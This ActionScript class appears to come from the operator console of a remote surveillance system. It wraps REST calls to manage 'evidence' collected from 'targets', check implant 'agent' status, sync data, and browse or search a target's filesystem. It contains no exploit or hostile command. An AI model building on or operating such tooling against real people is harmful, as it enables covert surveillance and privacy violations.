package it.ht.rcs.console.evidence.rest
{
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.evidence.model.Evidence;
  import it.ht.rcs.console.evidence.model.Filter;
  
  import mx.collections.ArrayCollection;
  import mx.rpc.CallResponder;

  public class DBEvidence extends _Super_DBEvidence implements IDBEvidence
  {

    public function DBEvidence(host: String)
    {
      super();
      _serviceControl.baseURL = host;
    }

    public function all(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = all_(JSON.stringify(filter));
    }
    
    public function update(evidence:Evidence, property:Object, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      property['_id'] = evidence._id;
      property['target'] = target;
      resp.token = update_(JSON.stringify(property));
    }
    
    public function update_multi(evidences:Array, property:Object, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      property['_ids'] = evidences;
      property['target'] = target;
      resp.token = update_multi_(JSON.stringify(property));
    }
    
    public function destroy(evidence:Evidence, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      var params:Object=new Object();
      params['_id'] = evidence._id;
      params['target'] = target;
      resp.token = destroy_(JSON.stringify(params));
    }

    public function destroy_all(params: Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = destroy_all_(JSON.stringify(params));
    }

    public function sync_start(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = sync_start_(JSON.stringify(params));
    }

    public function sync_stop(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = sync_stop_(JSON.stringify(params));
    }

    public function info(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
        var resp:CallResponder = DB.getCallResponder(onResult, onFault);
        resp.token = info_(JSON.stringify(filter));
    }
    
    public function commands(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = commands_(JSON.stringify(filter));
    }
    
    public function sync_history(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = sync_history_(JSON.stringify(filter));
    }
    
    public function total(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = total_(JSON.stringify(filter));
    }

    public function agent_status(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = agent_status_(JSON.stringify(params));
    }
    
  /*  public function filesystem(targetId:String, agentId:String, filter:String, onResult:Function = null, onFault:Function = null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystem_(targetId, agentId, filter);
    }*/
    
    public function filesystem(targetId:String, agentId:String, path:String, onResult:Function = null, onFault:Function = null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystem_(targetId, agentId, path);
    }
    
    public function filesystem_search(targetId:String, agentId:String, search:String, start:int=0, onResult:Function = null, onFault:Function = null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystem_search_(targetId, agentId, search, start);
    }
    
    public function show(id:String, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = show_(id, target);
    }
    
    public function filter_all(onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filter_all_();
    }
    
    public function filter_destroy(filter:Filter, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filter_destroy_(JSON.stringify({_id: filter._id}));
    }
    
    public function filter_create(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filter_create_(JSON.stringify(filter));
    }
    
    public function translate(id:String, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = translate_(id, target);
    }

    /**
     * Override super.init() to provide any initialization customization if needed.
     */
    protected override function preInitializeService():void
    {
      super.preInitializeService();
      // Initialization customization goes here
    }
    

  }

}